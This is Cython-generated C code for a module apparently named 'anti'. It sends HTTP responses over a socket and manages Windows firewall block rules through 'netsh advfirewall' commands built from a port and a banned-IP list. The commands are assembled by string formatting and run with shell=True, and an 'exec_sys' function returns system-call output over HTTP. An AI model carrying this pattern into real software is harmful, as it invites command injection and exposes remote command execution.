            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
            __Pyx_INCREF(__pyx_t_1);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_3, function);
        }
    }
    __pyx_t_7 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_1, __pyx_kp_b_HTTP_1_0_200_OK_Content_Type_tex) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_kp_b_HTTP_1_0_200_OK_Content_Type_tex);
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 81, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_7 = PyInt_FromSsize_t(__pyx_v_content_length); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 82, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_9 = (__pyx_t_7 != Py_None);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_22 = (__pyx_t_9 != 0);
    if (__pyx_t_22) {
        __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_conn, __pyx_n_s_sendall); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 83, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_3);
        __pyx_t_1 = PyInt_FromSsize_t(__pyx_v_content_length); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 83, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_5 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 83, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = PyUnicode_AsASCIIString(((PyObject*)__pyx_t_5)); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 83, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_kp_b_Content_Length, __pyx_t_1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 83, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_1 = PyNumber_Add(__pyx_t_5, __pyx_kp_b__16); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 83, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
            __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_3);
            if (likely(__pyx_t_5)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
                __Pyx_INCREF(__pyx_t_5);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_3, function);
            }
        }
        __pyx_t_7 = (__pyx_t_5) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_5, __pyx_t_1) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_1);
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 83, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_7);
        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    }
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_conn, __pyx_n_s_sendall); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 84, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_1 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
        __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_3);
        if (likely(__pyx_t_1)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
            __Pyx_INCREF(__pyx_t_1);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_3, function);
        }
    }
    __pyx_t_7 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_1, __pyx_kp_b__16) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_kp_b__16);
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 84, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_conn, __pyx_n_s_sendall); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 85, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_v_payload); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 85, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_5 = PyUnicode_AsEncodedString(((PyObject*)__pyx_t_1), NULL, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 85, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
        __pyx_t_1 = PyMethod_GET_SELF(__pyx_t_3);
        if (likely(__pyx_t_1)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
            __Pyx_INCREF(__pyx_t_1);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_3, function);
        }
    }
    __pyx_t_7 = (__pyx_t_1) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_1, __pyx_t_5) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_5);
    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 85, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_conn, __pyx_n_s_close); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 86, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_5 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_3);
        if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_3, function);
        }
    }
    __pyx_t_7 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 86, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __Pyx_XDECREF(__pyx_r);
    __pyx_r = Py_None; __Pyx_INCREF(Py_None);
    goto __pyx_L0;
__pyx_L1_error:;
    __Pyx_XDECREF(__pyx_t_1);
    __Pyx_XDECREF(__pyx_t_2);
    __Pyx_XDECREF(__pyx_t_3);
    __Pyx_XDECREF(__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_6);
    __Pyx_XDECREF(__pyx_t_7);
    __Pyx_AddTraceback("anti.exec_sys", __pyx_clineno, __pyx_lineno, __pyx_filename);
    __pyx_r = NULL;
__pyx_L0:;
    __Pyx_XDECREF(__pyx_v_subprocess);
    __Pyx_XDECREF(__pyx_v_payload);
    __Pyx_XDECREF(__pyx_v_e);
    __Pyx_XGIVEREF(__pyx_r);
    __Pyx_RefNannyFinishContext();
    return __pyx_r;
}
static PyObject* __pyx_pw_4anti_13create_rule(PyObject* __pyx_self, PyObject* __pyx_v_port);
static PyMethodDef __pyx_mdef_4anti_13create_rule = { "create_rule", (PyCFunction)__pyx_pw_4anti_13create_rule, METH_O, 0 };
static PyObject* __pyx_pw_4anti_13create_rule(PyObject* __pyx_self, PyObject* __pyx_v_port) {
    PyObject* __pyx_r = 0;
    __Pyx_RefNannyDeclarations
        __Pyx_RefNannySetupContext("create_rule (wrapper)", 0);
    __pyx_r = __pyx_pf_4anti_12create_rule(__pyx_self, ((PyObject*)__pyx_v_port));
    __Pyx_RefNannyFinishContext();
    return __pyx_r;
}

static PyObject* __pyx_pf_4anti_12create_rule(CYTHON_UNUSED PyObject* __pyx_self, PyObject* __pyx_v_port) {
    CYTHON_UNUSED PyObject* __pyx_v__ = NULL;
    PyObject* __pyx_r = NULL;
    __Pyx_RefNannyDeclarations
        PyObject* __pyx_t_1 = NULL;
    PyObject* __pyx_t_2 = NULL;
    PyObject* __pyx_t_3 = NULL;
    PyObject* __pyx_t_4 = NULL;
    PyObject* __pyx_t_5 = NULL;
    PyObject* __pyx_t_6 = NULL;
    PyObject* __pyx_t_7 = NULL;
    PyObject* __pyx_t_8 = NULL;
    int __pyx_t_9;
    int __pyx_t_10;
    PyObject* __pyx_t_11 = NULL;
    PyObject* __pyx_t_12 = NULL;
    int __pyx_lineno = 0;
    const char* __pyx_filename = NULL;
    int __pyx_clineno = 0;
    __Pyx_RefNannySetupContext("create_rule", 0);
    __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_Popen); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 90, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
    __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_netsh_advfirewall_firewall_show, __pyx_n_s_format); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 90, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_6);
    __pyx_t_7 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_v_port); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 90, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_8 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_8)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
            __Pyx_INCREF(__pyx_t_8);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_6, function);
        }
    }
    __pyx_t_5 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_8, __pyx_t_7) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_7);
    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 90, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_6 = PyTuple_New(1); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 90, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_6);
    __Pyx_GIVEREF(__pyx_t_5);
    PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_t_5);
    __pyx_t_5 = 0;
    __pyx_t_5 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 90, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_5);
    if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_shell, Py_True) < 0) __PYX_ERR(0, 90, __pyx_L1_error)
        __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_PIPE); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 90, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_7);
    if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_stdout, __pyx_t_7) < 0) __PYX_ERR(0, 90, __pyx_L1_error)
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_t_6, __pyx_t_5); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 90, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_stdout); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 90, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_read); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 90, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    __pyx_t_5 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
        __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_7);
        if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_7, function);
        }
    }
    __pyx_t_3 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 90, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_decode); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 90, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
        __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_7);
        if (likely(__pyx_t_3)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
            __Pyx_INCREF(__pyx_t_3);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_7, function);
        }
    }
    __pyx_t_2 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_7);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 90, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_7 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_split); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 90, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_7))) {
        __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_7);
        if (likely(__pyx_t_2)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_7);
            __Pyx_INCREF(__pyx_t_2);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_7, function);
        }
    }
    __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_7, __pyx_t_2, __pyx_kp_u__16) : __Pyx_PyObject_CallOneArg(__pyx_t_7, __pyx_kp_u__16);
    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 90, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_7 = __Pyx_GetItemInt(__pyx_t_1, 1, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 90, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_7);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __pyx_t_1 = __Pyx_PyObject_GetSlice(__pyx_t_7, 0, 2, NULL, NULL, &__pyx_slice__17, 0, 1, 1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 90, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    __pyx_t_9 = (__Pyx_PyUnicode_Equals(__pyx_t_1, __pyx_n_u_No, Py_EQ)); if (unlikely(__pyx_t_9 < 0)) __PYX_ERR(0, 90, __pyx_L1_error)
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    if (__pyx_t_9) {
        __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_Popen); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 91, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_netsh_advfirewall_firewall_add_r, __pyx_n_s_format); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 91, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_v_port); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 91, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_3);
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_list_ban_ip); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 91, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_6 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_5); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 91, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_6);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
            __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_2);
            if (likely(__pyx_t_5)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
                __Pyx_INCREF(__pyx_t_5);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_2, function);
                __pyx_t_10 = 1;
            }
        }
#if CYTHON_FAST_PYCALL
        if (PyFunction_Check(__pyx_t_2)) {
            PyObject* __pyx_temp[3] = { __pyx_t_5, __pyx_t_3, __pyx_t_6 };
            __pyx_t_7 = __Pyx_PyFunction_FastCall(__pyx_t_2, __pyx_temp + 1 - __pyx_t_10, 2 + __pyx_t_10); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 91, __pyx_L1_error)
                __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
            __Pyx_GOTREF(__pyx_t_7);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        }
        else
#endif
#if CYTHON_FAST_PYCCALL
            if (__Pyx_PyFastCFunction_Check(__pyx_t_2)) {
                PyObject* __pyx_temp[3] = { __pyx_t_5, __pyx_t_3, __pyx_t_6 };
                __pyx_t_7 = __Pyx_PyCFunction_FastCall(__pyx_t_2, __pyx_temp + 1 - __pyx_t_10, 2 + __pyx_t_10); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 91, __pyx_L1_error)
                    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                __Pyx_GOTREF(__pyx_t_7);
                __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            }
            else
#endif
            {
                __pyx_t_4 = PyTuple_New(2 + __pyx_t_10); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 91, __pyx_L1_error)
                    __Pyx_GOTREF(__pyx_t_4);
                if (__pyx_t_5) {
                    __Pyx_GIVEREF(__pyx_t_5); PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_t_5); __pyx_t_5 = NULL;
                }
                __Pyx_GIVEREF(__pyx_t_3);
                PyTuple_SET_ITEM(__pyx_t_4, 0 + __pyx_t_10, __pyx_t_3);
                __Pyx_GIVEREF(__pyx_t_6);
                PyTuple_SET_ITEM(__pyx_t_4, 1 + __pyx_t_10, __pyx_t_6);
                __pyx_t_3 = 0;
                __pyx_t_6 = 0;
                __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_4, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 91, __pyx_L1_error)
                    __Pyx_GOTREF(__pyx_t_7);
                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            }
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = PyTuple_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 91, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_2);
        __Pyx_GIVEREF(__pyx_t_7);
        PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_t_7);
        __pyx_t_7 = 0;
        __pyx_t_7 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 91, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_7);
        if (PyDict_SetItem(__pyx_t_7, __pyx_n_s_shell, Py_True) < 0) __PYX_ERR(0, 91, __pyx_L1_error)
            __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_DEVNULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 91, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_4);
        if (PyDict_SetItem(__pyx_t_7, __pyx_n_s_stdout, __pyx_t_4) < 0) __PYX_ERR(0, 91, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_2, __pyx_t_7); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 91, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        __pyx_v__ = __pyx_t_4;
        __pyx_t_4 = 0;
        goto __pyx_L3;
    } {
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_Popen); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 93, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_kp_u_netsh_advfirewall_firewall_set_r, __pyx_n_s_format); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 93, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_1 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_v_port); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 93, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_1);
        __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_list_ban_ip); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 93, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_6);
        __pyx_t_3 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_6); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 93, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_3);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
            __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_2);
            if (likely(__pyx_t_6)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
                __Pyx_INCREF(__pyx_t_6);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_2, function);
                __pyx_t_10 = 1;
            }
        }
#if CYTHON_FAST_PYCALL
        if (PyFunction_Check(__pyx_t_2)) {
            PyObject* __pyx_temp[3] = { __pyx_t_6, __pyx_t_1, __pyx_t_3 };
            __pyx_t_7 = __Pyx_PyFunction_FastCall(__pyx_t_2, __pyx_temp + 1 - __pyx_t_10, 2 + __pyx_t_10); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 93, __pyx_L1_error)
                __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_GOTREF(__pyx_t_7);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
        }
        else
#endif
#if CYTHON_FAST_PYCCALL
            if (__Pyx_PyFastCFunction_Check(__pyx_t_2)) {
                PyObject* __pyx_temp[3] = { __pyx_t_6, __pyx_t_1, __pyx_t_3 };
                __pyx_t_7 = __Pyx_PyCFunction_FastCall(__pyx_t_2, __pyx_temp + 1 - __pyx_t_10, 2 + __pyx_t_10); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 93, __pyx_L1_error)
                    __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
                __Pyx_GOTREF(__pyx_t_7);
                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            }
            else
#endif
            {
                __pyx_t_5 = PyTuple_New(2 + __pyx_t_10); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 93, __pyx_L1_error)
                    __Pyx_GOTREF(__pyx_t_5);
                if (__pyx_t_6) {
                    __Pyx_GIVEREF(__pyx_t_6); PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_6); __pyx_t_6 = NULL;
                }
                __Pyx_GIVEREF(__pyx_t_1);
                PyTuple_SET_ITEM(__pyx_t_5, 0 + __pyx_t_10, __pyx_t_1);
                __Pyx_GIVEREF(__pyx_t_3);
                PyTuple_SET_ITEM(__pyx_t_5, 1 + __pyx_t_10, __pyx_t_3);
                __pyx_t_1 = 0;
                __pyx_t_3 = 0;
                __pyx_t_7 = __Pyx_PyObject_Call(__pyx_t_2, __pyx_t_5, NULL); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 93, __pyx_L1_error)
                    __Pyx_GOTREF(__pyx_t_7);
                __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
            }
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __pyx_t_2 = PyTuple_New(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 93, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_2);
        __Pyx_GIVEREF(__pyx_t_7);
        PyTuple_SET_ITEM(__pyx_t_2, 0, __pyx_t_7);
        __pyx_t_7 = 0;
        __pyx_t_7 = __Pyx_PyDict_NewPresized(3); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 93, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_7);
        if (PyDict_SetItem(__pyx_t_7, __pyx_n_s_shell, Py_True) < 0) __PYX_ERR(0, 93, __pyx_L1_error)
            __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_PIPE); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 93, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_t_7, __pyx_n_s_stdin, __pyx_t_5) < 0) __PYX_ERR(0, 93, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
